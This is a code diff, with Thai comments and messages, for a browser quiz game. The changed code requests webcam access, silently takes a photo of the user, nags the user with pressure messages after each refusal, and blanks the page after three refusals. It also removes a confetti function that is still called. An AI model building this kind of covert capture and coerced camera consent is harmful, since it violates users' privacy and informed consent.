@@ -1,15 +1,21 @@
+let cameraAttempts = 0;
 let currentPage = 1;
 let wrongCount = 0;
 let score = 0;
-let cameraAttempts = 0;
 let userPhoto = null;
+let isRequesting = false;
 
 const pages = document.querySelectorAll('.page');
 const message = document.getElementById('message');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
-document.getElementById('startBtn').addEventListener('click', initCamera);
+// แทนที่ Event Listener เดิมด้วยโค้ดนี้
+document.getElementById('startBtn').addEventListener('click', function() {
+    this.disabled = true;
+    initCamera();
+    setTimeout(() => this.disabled = false, 3000);
+});
 
 function showPage(pageNumber) {
     pages.forEach(page => page.classList.remove('active'));
@@ -17,15 +23,22 @@ function showPage(pageNumber) {
     currentPage = pageNumber;
 }
 
+// แทนที่ฟังก์ชัน initCamera ทั้งหมดด้วยโค้ดนี้
 async function initCamera() {
+    if (isRequesting) return;
+    isRequesting = true;
+    
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
         await video.play();
         takePhoto();
         showPage(2);
+        cameraAttempts = 0;
     } catch (err) {
         handleCameraError();
+    } finally {
+        isRequesting = false;
     }
 }
 
@@ -36,8 +49,10 @@ function takePhoto() {
     userPhoto = canvas.toDataURL('image/png');
 }
 
+// แทนที่ฟังก์ชัน handleCameraError ทั้งหมดด้วยโค้ดนี้
 function handleCameraError() {
     cameraAttempts++;
+    
     const messages = [
         'หากไม่อนุญาตจะไม่สามารถเล่นเกมนี้ได้',
         'โปรดกดอนุญาตเพื่อเล่นเกม',
@@ -48,12 +63,14 @@ function handleCameraError() {
     
     if(cameraAttempts === 3) {
         setTimeout(() => {
-            window.close() || (window.location.href = 'about:blank');
+            window.location.href = 'about:blank';
         }, 1000);
         return;
     }
 
-    setTimeout(() => initCamera(), cameraAttempts === 3 ? 1000 : 3000);
+    setTimeout(() => {
+        initCamera();
+    }, cameraAttempts === 3 ? 1000 : 3000);
 }
 
 function showMessage(text, duration) {
@@ -145,13 +162,5 @@ function updateGameContent() {
     } else if(currentPage === 5) {
         document.getElementById('scoreDisplay').textContent = `${score}/3`;
         createConfetti();
-    }
-}
-
-function createConfetti() {
-    for(let i = 0; i < 50; i++) {
-        const confetti = document.createElement('div');
-        confetti.className = 'confetti';
-        document.body.appendChild(confetti);
     }
 }
